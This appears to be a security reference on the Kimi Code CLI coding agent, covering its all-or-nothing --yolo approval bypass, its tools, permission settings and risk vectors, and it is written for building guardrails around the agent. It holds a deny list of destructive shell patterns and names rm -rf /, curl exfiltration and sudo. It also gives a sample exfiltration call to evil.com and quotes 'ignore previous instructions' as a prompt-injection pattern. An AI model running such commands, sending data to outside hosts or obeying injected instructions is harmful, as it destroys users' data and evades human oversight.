
### Network Access Restrictions

**Not supported.** There are no configuration options to restrict network access. The agent can use web search, URL fetching, and MCP HTTP servers without restriction.

### Bypass Mode: `--yolo`

Kimi Code CLI has a `--yolo` (also `--yes`, `-y`, `--auto-approve`) flag that **bypasses all permission checks**:

| Activation method | Scope |
|-------------------|-------|
| `kimi --yolo` | Command-line startup |
| `/yolo` slash command | Toggle during interactive session |
| `default_yolo = true` in `config.toml` | Persistent default |
| `kimi --print` | Implicit (print mode always enables yolo) |

**Safeguards around `--yolo`:**
- A yellow "YOLO" badge appears in the status bar during interactive use (visual indicator only).
- The documentation warns: "YOLO mode skips all confirmations. Make sure you understand the potential risks. It's recommended to only use this in controlled environments."
- There is no way to partially enable yolo (e.g., approve file reads but not shell commands). It is all-or-nothing.

**Critical security implication:** When `--yolo` is active, `ApprovalRequest` messages are never sent over the Wire protocol, completely eliminating the only blocking interception mechanism available to Wire clients.

### Detecting Elevated Privileges via Wire Client

While Kimi Code CLI itself does not detect elevated privileges, a Wire client wrapper can check before launching:

```bash
#!/bin/bash
# Wrapper script that refuses to run as root
if [ "$(id -u)" -eq 0 ]; then
    echo "ERROR: Refusing to run Kimi Code CLI as root." >&2
    exit 1
fi
exec kimi --wire "$@"
```

### Sources

- [kimi command reference](https://moonshotai.github.io/kimi-cli/en/reference/kimi-command.html)
- [Configuration overrides](https://moonshotai.github.io/kimi-cli/en/configuration/overrides.html)
- [Interaction guide](https://moonshotai.github.io/kimi-cli/en/guides/interaction.html)
- [Print mode](https://moonshotai.github.io/kimi-cli/en/customization/print-mode.html)

---

## Summary of Protection Capabilities

| Capability | Supported | Mechanism | Limitations |
|------------|-----------|-----------|-------------|
| Pre-tool blocking | Partial | `ApprovalRequest` over Wire | Only for tools requiring approval; bypassed by `--yolo` |
| Pre-tool modification | No | -- | Cannot modify tool arguments |
| User prompt interception | Observe only | `TurnBegin` notification | Cannot block or modify |
| Post-tool audit | Yes | `ToolResult` notification | Cannot undo; observation only |
| MCP response interception | No | -- | MCP results go directly to agent |
| Completion gating | No (workaround) | Send new `prompt` after completion | No native blocking; client-side loop needed |
| Subagent event visibility | Yes | `SubagentEvent` wrapper | Blocking behavior in subagents unclear |
| Subagent tool restriction | Yes | Agent YAML `exclude_tools` | Requires custom agent file |
| Sandbox isolation | No | -- | Runs with full user permissions |
| Root detection | No | -- | Must be implemented in wrapper |
| Permission bypass | Yes | `--yolo` / `--print` | All-or-nothing; no partial approval |

---

## Built-in Tools

Kimi Code CLI provides 14 built-in tools, each referenced by its Python module path in agent YAML configurations (`module:ClassName` format). Tools that modify files or execute commands require user approval in standard mode; this approval is bypassed entirely in `--yolo` mode.

### Tool Catalog

#### 1. Shell

- **Module path:** `kimi_cli.tools.shell:Shell`
- **Description:** Executes shell commands in the user's environment. Requires user approval before execution.
- **Parameters:**
  - `command` (string, required): The shell command to execute.
  - `timeout` (integer, optional): Execution timeout in seconds. Default: 60, maximum: 300.
- **Examples:**
  - `Shell(command="cargo test --lib", timeout=120)` -- run project tests with a 2-minute timeout.
  - `Shell(command="git diff --stat HEAD~3")` -- view recent git changes.
  - `Shell(command="find . -name '*.rs' | wc -l")` -- count Rust source files.

#### 2. ReadFile

- **Module path:** `kimi_cli.tools.file:ReadFile`
- **Description:** Reads the contents of a text file with optional line offset and line count constraints. Does not require approval.
- **Parameters:**
  - `path` (string, required): Path to the file.
  - `line_offset` (integer, optional): Starting line number (0-indexed).
  - `n_lines` (integer, optional): Number of lines to read. Maximum: 1000. Lines exceeding 2000 characters are truncated.
- **Examples:**
  - `ReadFile(path="src/main.rs")` -- read an entire source file.
  - `ReadFile(path="logs/app.log", line_offset=500, n_lines=100)` -- read lines 500-599 of a log file.
  - `ReadFile(path="Cargo.toml", n_lines=30)` -- read the first 30 lines of a manifest.

#### 3. ReadMediaFile

- **Module path:** `kimi_cli.tools.file:ReadMediaFile`
- **Description:** Reads image or video files for visual analysis. Maximum file size: 100MB. Does not require approval.
- **Parameters:**
  - `path` (string, required): Path to the media file.
- **Examples:**
  - `ReadMediaFile(path="docs/architecture.png")` -- analyze a diagram image.
  - `ReadMediaFile(path="screenshots/error.jpg")` -- inspect a screenshot of an error.

#### 4. WriteFile

- **Module path:** `kimi_cli.tools.file:WriteFile`
- **Description:** Creates or overwrites a file with new content. Requires user approval.
- **Parameters:**
  - `path` (string, required): Path to the file.
  - `content` (string, required): The content to write.
  - `mode` (string, optional): `"overwrite"` (default) or `"append"`.
- **Examples:**
  - `WriteFile(path="src/config.rs", content="pub const VERSION: &str = \"1.0\";\n")` -- create a new source file.
  - `WriteFile(path="notes.md", content="\n## New Section\n", mode="append")` -- append to an existing file.
  - `WriteFile(path=".env.example", content="DATABASE_URL=\nAPI_KEY=\n")` -- create a template config file.

#### 5. StrReplaceFile

- **Module path:** `kimi_cli.tools.file:StrReplaceFile`
- **Description:** Edits files using exact string replacement. Requires user approval. The `old` string must match exactly once unless `replace_all` is true.
- **Parameters:**
  - `path` (string, required): Path to the file.
  - `edit` (object, required): Contains `old` (string to find) and `new` (replacement string).
  - `replace_all` (boolean, optional): Replace all occurrences. Default: false.
- **Examples:**
  - `StrReplaceFile(path="Cargo.toml", edit={old: 'version = "0.1.0"', new: 'version = "0.2.0"'})` -- bump a version number.
  - `StrReplaceFile(path="src/lib.rs", edit={old: "pub fn old_name(", new: "pub fn new_name("}, replace_all=true)` -- rename a function across all occurrences.

#### 6. Glob

- **Module path:** `kimi_cli.tools.file:Glob`
- **Description:** Pattern matching for files and directories. Does not require approval.
- **Parameters:**
  - `pattern` (string, required): Glob pattern (e.g., `**/*.rs`).
  - `directory` (string, optional): Root directory for the search.
  - `include_dirs` (boolean, optional): Include directory matches.
- **Examples:**
  - `Glob(pattern="**/*.ts", directory="src/")` -- find all TypeScript files under `src/`.
  - `Glob(pattern="**/test_*.py")` -- find all Python test files.
  - `Glob(pattern="**/Cargo.toml", include_dirs=false)` -- find all Cargo manifests in a workspace.

#### 7. Grep

- **Module path:** `kimi_cli.tools.file:Grep`
- **Description:** Searches file content using regular expressions, powered by ripgrep. Does not require approval.
- **Parameters:**
  - `pattern` (string, required): Regex pattern.
  - `path` (string, optional): File or directory to search.
  - `glob` (string, optional): Glob filter for files.
  - `type` (string, optional): File type filter (e.g., `"rust"`, `"py"`).
  - `output_mode` (string, optional): `"content"`, `"files_with_matches"`, or `"count"`.
  - `flags` (object, optional): `-B` (before), `-A` (after), `-C` (context), `-n` (line numbers), `-i` (case-insensitive).
  - `multiline` (boolean, optional): Enable multiline matching.
  - `head_limit` (integer, optional): Limit output entries.
- **Examples:**
  - `Grep(pattern="TODO|FIXME", path="src/", type="rust")` -- find all TODO comments in Rust files.
  - `Grep(pattern="fn main", glob="**/*.rs", output_mode="files_with_matches")` -- find files containing a main function.
  - `Grep(pattern="unsafe", path=".", flags={"-C": 3}, type="rust")` -- find unsafe blocks with 3 lines of context.

#### 8. SearchWeb

- **Module path:** `kimi_cli.tools.web:SearchWeb`
- **Description:** Conducts internet searches for real-time information. Does not require approval.
- **Parameters:**
  - `query` (string, required): Search query.
  - `limit` (integer, optional): Number of results. Default: 5, maximum: 20.
  - `include_content` (boolean, optional): Whether to include page content in results.
- **Examples:**
  - `SearchWeb(query="rust tokio 1.48 migration guide", limit=5)` -- search for documentation.
  - `SearchWeb(query="CVE-2026-1234 severity", include_content=true)` -- research a vulnerability.

#### 9. FetchURL

- **Module path:** `kimi_cli.tools.web:FetchURL`
- **Description:** Fetches webpage content and returns extracted main text. Does not require approval.
- **Parameters:**
  - `url` (string, required): The URL to fetch.
- **Examples:**
  - `FetchURL(url="https://docs.rs/tokio/latest/tokio/")` -- fetch Rust documentation.
  - `FetchURL(url="https://api.github.com/repos/owner/repo/releases/latest")` -- fetch JSON API data.

#### 10. Think

- **Module path:** `kimi_cli.tools.think:Think`
- **Description:** Records the agent's thinking process, suitable for complex reasoning scenarios that benefit from explicit chain-of-thought. Does not require approval.
- **Parameters:**
  - `thought` (string, required): The reasoning content.
- **Examples:**
  - `Think(thought="The error is in the borrow checker. The variable is moved on line 42 but used on line 50. I need to clone it or use a reference.")` -- record reasoning during debugging.
  - `Think(thought="There are three approaches: A) refactor the trait, B) add a wrapper, C) use dynamic dispatch. Option B preserves backward compatibility...")` -- reason through design choices.

#### 11. Task

- **Module path:** `kimi_cli.tools.multiagent:Task`
- **Description:** Dispatches a subagent to execute a task. Subagents cannot access the main agent's context. Requires approval if the subagent performs approval-requiring operations.
- **Parameters:**
  - `description` (string, required): Short summary of the task.
  - `subagent_name` (string, optional): Name of a declared subagent to use.
  - `prompt` (string, required): Full instructions for the subagent.
- **Examples:**
  - `Task(description="Write unit tests", subagent_name="coder", prompt="Write comprehensive tests for src/parser.rs covering edge cases.")` -- delegate test writing to a subagent.
  - `Task(description="Review security", prompt="Audit the authentication module for common vulnerabilities like SQL injection and XSS.")` -- delegate a security review.
  - `Task(description="Research alternatives", subagent_name="researcher", prompt="Find and compare Rust HTTP client libraries.")` -- delegate research work.

#### 12. SetTodoList

- **Module path:** `kimi_cli.tools.todo:SetTodoList`
- **Description:** Creates and manages a task progress list for tracking multi-step work. Does not require approval.
- **Parameters:**
  - `todos` (array, required): Array of objects, each with `title` (string) and `status` (`"pending"`, `"in_progress"`, or `"done"`).
- **Examples:**
  - `SetTodoList(todos=[{title: "Fix parsing bug", status: "done"}, {title: "Add tests", status: "in_progress"}, {title: "Update docs", status: "pending"}])` -- track progress on a multi-step task.

#### 13. CreateSubagent

- **Module path:** `kimi_cli.tools.multiagent:CreateSubagent`
- **Description:** Dynamically creates a new subagent type during runtime. **Not enabled by default** -- must be explicitly added to the agent's tool list.
- **Parameters:**
  - `name` (string, required): Unique identifier for the subagent.
  - `system_prompt` (string, required): Role definition and instructions.
  - `tools` (array, optional): Tool module paths available to the subagent.
- **Examples:**
  - `CreateSubagent(name="linter", system_prompt="You are a code quality reviewer. Only report issues, do not fix them.", tools=["kimi_cli.tools.file:ReadFile", "kimi_cli.tools.file:Grep"])` -- create a read-only analysis subagent at runtime.
  - `CreateSubagent(name="formatter", system_prompt="Format code according to project standards.", tools=["kimi_cli.tools.shell:Shell", "kimi_cli.tools.file:ReadFile"])` -- create a formatting subagent.

#### 14. SendDMail

- **Module path:** `kimi_cli.tools.dmail:SendDMail`
- **Description:** An experimental tool for checkpoint rollback scenarios. Only available in the `okabe` agent. Not available in the `default` agent.
- **Parameters:**
  - `message` (string, required): The message to send.
  - `checkpoint_id` (integer, required): Target checkpoint ID.
- **Examples:**
  - `SendDMail(message="Revert: the refactoring introduced a regression", checkpoint_id=3)` -- roll back to a prior checkpoint.

### Approval Requirements Summary

| Tool | Requires Approval | Category |
|------|-------------------|----------|
| Shell | Yes | Command execution |
| WriteFile | Yes | File modification |
| StrReplaceFile | Yes | File modification |
| ReadFile | No | Read-only |
| ReadMediaFile | No | Read-only |
| Glob | No | Read-only |
| Grep | No | Read-only |
| SearchWeb | No | Read-only |
| FetchURL | No | Read-only |
| Think | No | Internal reasoning |
| SetTodoList | No | Task tracking |
| Task | Depends on subagent | Delegation |
| CreateSubagent | No (tool creation) | Delegation |
| SendDMail | Unknown | Experimental |

**Note:** MCP tool calls also require approval, following the same mechanism as built-in tools that modify state.

### Permissions

**Primary documentation:** [Agents and Subagents](https://moonshotai.github.io/kimi-cli/en/customization/agents.html)

Kimi Code CLI does **not** have a standalone permissions configuration file or a dedicated permissions documentation page. Instead, tool permissions are managed through a combination of agent YAML definitions, CLI flags, and the Wire protocol. There is no granular permission system like Claude Code's `permissions.allow` / `permissions.deny` rules with path patterns.

#### Permission Configuration Methods

**1. Agent YAML: `tools` and `exclude_tools` (agent/subagent scoped)**

The most granular permission control is through agent YAML files, where you explicitly list which tools an agent or subagent may use.

```yaml
# restricted-agent.yaml
version: 1
agent:
  name: restricted
  extend: default
  exclude_tools:
    - "kimi_cli.tools.shell:Shell"
    - "kimi_cli.tools.file:WriteFile"
    - "kimi_cli.tools.file:StrReplaceFile"
    - "kimi_cli.tools.multiagent:CreateSubagent"
  system_prompt_path: ./prompt.md
```

Alternatively, use a positive `tools` list to specify exactly which tools are available:

```yaml
version: 1
agent:
  name: readonly
  tools:
    - "kimi_cli.tools.file:ReadFile"
    - "kimi_cli.tools.file:Glob"
    - "kimi_cli.tools.file:Grep"
    - "kimi_cli.tools.web:SearchWeb"
    - "kimi_cli.tools.web:FetchURL"
    - "kimi_cli.tools.think:Think"
  system_prompt_path: ./readonly-prompt.md
```

**2. CLI flags: `--yolo` / `--yes` / `-y` (session scoped)**

Bypasses all approval prompts for the entire session. Affects all tools equally -- there is no way to selectively auto-approve some tools but not others.

```bash
# All operations auto-approved
kimi --yolo

# Or via config file
# default_yolo = true  in ~/.kimi/config.toml
```

**3. CLI flag: `--agent-file` (session scoped)**

Selects a custom agent definition that specifies tool restrictions:

```bash
kimi --agent-file ./restricted-agent.yaml
```

**4. Wire protocol (runtime, programmatic)**

Wire clients can implement fine-grained, dynamic permission logic by responding to `ApprovalRequest` messages. This is the most flexible approach but requires building a Wire client.

**5. Print mode: `--print` (session scoped)**

Implicitly enables `--yolo`, auto-approving all operations. Intended for CI/CD automation.

```bash
echo "Fix the linting errors" | kimi --print
```

#### Not Supported

- **User-scoped permission rules** (no equivalent to Claude Code's `permissions.allow` / `permissions.deny` in settings files)
- **Repo-scoped permission rules** (no `.kimi/settings.json` with permission overrides)
- **Enterprise/managed permission policies** (no managed settings mechanism)
- **Slash command configuration of permissions** (slash commands cannot modify tool access)
- **Path-based restrictions** (no gitignore-style patterns for file access)
- **Network/domain restrictions** (no built-in controls for which URLs or domains can be accessed)

#### Configuration Examples

**Example 1: Read-only research agent**

An organization wants to allow the agent to read code and search the web, but prevent any modifications to the filesystem or execution of shell commands.

```yaml
# research-only.yaml
version: 1
agent:
  name: researcher
  tools:
    - "kimi_cli.tools.file:ReadFile"
    - "kimi_cli.tools.file:ReadMediaFile"
    - "kimi_cli.tools.file:Glob"
    - "kimi_cli.tools.file:Grep"
    - "kimi_cli.tools.web:SearchWeb"
    - "kimi_cli.tools.web:FetchURL"
    - "kimi_cli.tools.think:Think"
  system_prompt_path: ./research-prompt.md
```

Launch with: `kimi --agent-file ./research-only.yaml`

This approach works because the agent simply does not have access to `Shell`, `WriteFile`, or `StrReplaceFile`.

**Example 2: CI/CD pipeline with Wire-based guardrails**

A team runs Kimi in Wire mode within CI to generate code, but wants to block destructive commands like `rm -rf` and writes to paths outside the project.

```python
import json, sys, os

PROJECT_ROOT = os.getcwd()

def handle_approval(msg):
    payload = msg["params"]["payload"]
    sender = payload["sender"]
    description = payload.get("description", "")

    # Block destructive shell patterns
    if sender == "Shell":
        dangerous = ["rm -rf", "mkfs", "dd if=", "chmod 777", "> /dev/"]
        if any(p in description for p in dangerous):
            return "reject"

    # Block writes outside project root
    if sender in ("WriteFile", "StrReplaceFile"):
        # Extract path from description if possible
        if ".." in description or description.startswith("/"):
            if not description.startswith(PROJECT_ROOT):
                return "reject"

    return "approve"
```

This approach provides dynamic, content-aware permission decisions not possible with static configuration alone.

**Example 3: Subagent with strict isolation**

A developer wants the main agent to have full capability but restricts subagents to read-only operations with no shell access and no nested subagent creation.

```yaml
# main-agent.yaml
version: 1
agent:
  name: main
  extend: default
  subagents:
    worker:
      path: ./safe-worker.yaml
      description: "Read-only worker"
  system_prompt_path: ./main-prompt.md
```

```yaml
# safe-worker.yaml
version: 1
agent:
  name: safe_worker
  extend: default
  exclude_tools:
    - "kimi_cli.tools.shell:Shell"
    - "kimi_cli.tools.file:WriteFile"
    - "kimi_cli.tools.file:StrReplaceFile"
    - "kimi_cli.tools.multiagent:Task"
    - "kimi_cli.tools.multiagent:CreateSubagent"
  system_prompt_path: ./safe-worker-prompt.md
```

This prevents subagents from executing commands, modifying files, or spawning further subagents.

### Risk Vectors

- **Unrestricted shell execution via `Shell`**: The Shell tool is the highest-risk built-in tool. It can execute any command the user has access to, including destructive commands (`rm -rf /`, `DROP TABLE`), data exfiltration (`curl` to external servers), and privilege escalation (`sudo`). **Identification:** Look for patterns in the `command` parameter such as `rm -rf`, `sudo`, `chmod 777`, pipe chains to `curl`/`wget` targeting external hosts, `eval`, `exec`, and backtick-enclosed subcommands. In the Wire protocol, these patterns appear in the `ApprovalRequest` `description` field and the `ToolCall` notification's `function.arguments`. **Mitigation:** Use a Wire client to pattern-match `ApprovalRequest` descriptions against a denylist of dangerous commands. For agent YAML-based deployments, exclude `Shell` entirely when shell access is not needed. Never use `--yolo` in environments with untrusted inputs.

- **File writes to sensitive paths via `WriteFile` / `StrReplaceFile`**: These tools can overwrite critical system files, inject malicious code into source files, or write secrets to unintended locations. There is no built-in path restriction -- the agent can write to any path the OS user has access to. **Identification:** Inspect the `path` parameter for writes to system directories (`/etc/`, `/usr/`, `~/.ssh/`, `~/.bashrc`), credential files (`.env`, `credentials.json`, `id_rsa`), or paths outside the project root using `..` traversal. In Wire mode, these appear in `ApprovalRequest` with `sender: "WriteFile"` or `sender: "StrReplaceFile"`. **Mitigation:** Use agent YAML to exclude write tools for subagents that do not need them. In Wire mode, validate the `path` in the `ApprovalRequest` payload against an allowlist of directories. Use a wrapper script that sets `--work-dir` and rejects absolute paths outside it.

- **`--yolo` mode eliminating all safety gates**: When `--yolo` is active (either via CLI flag, `/yolo` slash command, `default_yolo = true` config, or implicitly via `--print` mode), `ApprovalRequest` messages are **never sent** over the Wire protocol. This completely eliminates the only blocking interception mechanism. Every tool call executes without any check. **Identification:** In Wire mode, the absence of `ApprovalRequest` messages for operations that normally require them indicates yolo mode is active. The status bar shows a yellow "YOLO" badge interactively, but there is no Wire-level notification that yolo mode was enabled. **Mitigation:** Never enable `--yolo` when processing untrusted input. For CI/CD pipelines, prefer Wire mode with a custom approval client over `--print` mode. If `--print` is used, restrict the agent's tools via `--agent-file` to a read-only tool set.

- **Data exfiltration via `SearchWeb` / `FetchURL`**: These web tools do not require approval and have no domain restrictions. An agent influenced by prompt injection could use `FetchURL` to send data to an attacker-controlled endpoint (e.g., encoding secrets in query parameters). **Identification:** Monitor `ToolCall` notifications for `SearchWeb` and `FetchURL` with suspicious URLs containing encoded data, unusually long query strings, or domains not related to the task. Look for patterns like `FetchURL(url="https://evil.com/collect?data=...")`. **Mitigation:** In Wire mode, observe `ToolCall` notifications for web tools and send a `cancel` request if suspicious URLs are detected (though this is a race condition). For strict environments, exclude `SearchWeb` and `FetchURL` from the agent's tool list via YAML. There is no built-in domain allowlist or denylist for web tools.

- **Uncontrolled subagent tool escalation via `CreateSubagent`**: The `CreateSubagent` tool (when enabled) allows the agent to dynamically create new subagents with arbitrary tool lists at runtime. This bypasses the static tool restrictions defined in agent YAML files, because the agent itself specifies which tools the new subagent receives. **Identification:** Monitor `ToolCall` notifications for `CreateSubagent` invocations and inspect the `tools` parameter for dangerous tool inclusions like `Shell` or `WriteFile`. **Mitigation:** Do not include `CreateSubagent` in the agent's tool list unless dynamic subagent creation is genuinely needed. When it is needed, implement a Wire client that intercepts the `ApprovalRequest` for the subsequent Task call and validates the subagent's tool set before approving. Prefer statically declared subagents in agent YAML with pre-defined restricted tool lists.

- **MCP tool calls bypassing safety assumptions**: MCP tools are treated as regular tools for approval purposes, but their behavior is opaque -- the agent and Wire client cannot inspect what an MCP server actually does with the inputs it receives. An MCP tool could exfiltrate data, execute destructive operations on external systems, or return prompt-injected responses. **Identification:** MCP tool calls appear as `ApprovalRequest` messages with `sender` matching the MCP tool name. The `ToolResult` notification contains the MCP response, which can be scanned for prompt injection patterns (e.g., "ignore previous instructions", embedded system prompts). **Mitigation:** Only use MCP servers from trusted sources. In Wire mode, scan `ToolResult` output for suspicious patterns and cancel the turn if detected. Use agent YAML `exclude_tools` to remove MCP tools from subagents that do not need them. The [MCP documentation](https://moonshotai.github.io/kimi-cli/en/customization/mcp.html) explicitly recommends maintaining manual approval for high-risk MCP tasks.

- **Context compaction degrading safety instructions**: When context compaction occurs (`CompactionBegin` / `CompactionEnd` events), safety instructions injected earlier in the conversation may be summarized away or lost entirely. The agent may then behave as if no safety constraints were in place. **Identification:** Monitor `StatusUpdate` events for `context_usage` approaching 1.0 and watch for `CompactionBegin`/`CompactionEnd` event pairs. **Mitigation:** Implement a Wire client that detects `CompactionEnd` and re-injects safety-critical instructions via a new `prompt` in the next turn. Use the `system_prompt_path` in agent YAML to embed safety instructions that persist across compaction (system prompts are not compacted). Set `reserved_context_size` in `config.toml` to preserve headroom for safety instructions.

### Sources

- [Agents and Subagents documentation](https://moonshotai.github.io/kimi-cli/en/customization/agents.html)
- [Wire Mode documentation](https://moonshotai.github.io/kimi-cli/en/customization/wire-mode.html)
- [MCP documentation](https://moonshotai.github.io/kimi-cli/en/customization/mcp.html)
- [Configuration files](https://moonshotai.github.io/kimi-cli/en/configuration/config-files.html)
- [Configuration overrides](https://moonshotai.github.io/kimi-cli/en/configuration/overrides.html)
- [Print mode](https://moonshotai.github.io/kimi-cli/en/customization/print-mode.html)
- [Interaction guide](https://moonshotai.github.io/kimi-cli/en/guides/interaction.html)
- [kimi command reference](https://moonshotai.github.io/kimi-cli/en/reference/kimi-command.html)

